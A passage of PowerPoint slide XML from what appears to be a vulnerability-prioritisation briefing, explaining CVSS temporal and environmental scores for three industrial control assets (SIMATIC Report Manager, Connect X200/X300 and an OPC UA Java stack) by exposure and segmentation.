      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4590288" y="2880360"/>
            <a:ext cx="3108960" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B2430"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Remediation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4590288" y="3291840"/>
            <a:ext cx="3108960" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="47515F"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>A vendor fix exists — the only thing pulling the score down</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8083296" y="2148840"/>
            <a:ext cx="3566160" cy="2103120"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3913"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="DDE3EC"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8357616" y="2377440"/>
            <a:ext cx="3108960" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2E6FD6"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>RC: Confirmed</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8357616" y="2880360"/>
            <a:ext cx="3108960" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B2430"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Report confidence</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8357616" y="3291840"/>
            <a:ext cx="3108960" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="47515F"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Vendor-confirmed, reproduced worldwide</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4617720"/>
            <a:ext cx="11094415" cy="1280160"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6429"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="101826"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="4800600"/>
            <a:ext cx="10881360" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8A97A8"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Adds to the string:   </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7FD1A8"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>…/E:H/RL:O/RC:C</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="5303520"/>
            <a:ext cx="10881360" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Before any patch existed, RL:U put this at the full 10.0.</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1826"/>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7FA8E6"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>ENVIRONMENTAL — WHERE CONTEXT CHANGES THE SCORE</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2700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Same flaw, three of our assets, three priorities</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1691640"/>
            <a:ext cx="11064240" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>For all three I set </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EEF3FA"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>IR:High and AR:High</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> — corrupted control data or lost availability threatens the grid. Segmentation only changes how reachable each one is.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2514600"/>
            <a:ext cx="3566160" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3600"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="16233A"/>
          </a:solidFill>
          <a:ln w="16510">
            <a:solidFill>
              <a:srgbClr val="D14343"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="2743200"/>
            <a:ext cx="2286000" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EEF3FA"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>SIMATIC Report Mgr</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2926080" y="2697480"/>
            <a:ext cx="1005840" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="r" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EE8888"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>9.5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="3566160"/>
            <a:ext cx="3017520" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Exposed at the IT/OT boundary — no mitigation. Critical. Fix first.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="4389120"/>
            <a:ext cx="3017520" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7FA8E6"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>/CR:M/IR:H/AR:H</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4315968" y="2514600"/>
            <a:ext cx="3566160" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3600"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="16233A"/>
          </a:solidFill>
          <a:ln w="16510">
            <a:solidFill>
              <a:srgbClr val="C87A1E"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4590288" y="2743200"/>
            <a:ext cx="2286000" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EEF3FA"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Connect X200/X300</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6693408" y="2697480"/>
            <a:ext cx="1005840" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="r" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E8B368"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>8.7</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4590288" y="3566160"/>
            <a:ext cx="3017520" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Remote but hardened telecontrol edge. High.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4590288" y="4389120"/>
            <a:ext cx="3017520" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7FA8E6"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>…/MAC:H</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8083296" y="2514600"/>
            <a:ext cx="3566160" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3600"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="16233A"/>
          </a:solidFill>
          <a:ln w="16510">
            <a:solidFill>
              <a:srgbClr val="C87A1E"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8357616" y="2743200"/>
            <a:ext cx="2286000" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EEF3FA"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>OPC UA Java stack</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10460736" y="2697480"/>
            <a:ext cx="1005840" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="r" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E8B368"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>8.0</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8357616" y="3566160"/>
            <a:ext cx="3017520" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Deep in segmented OT, adjacent-only. High.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8357616" y="4389120"/>
            <a:ext cx="3017520" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7FA8E6"/>
                </a:solidFill>
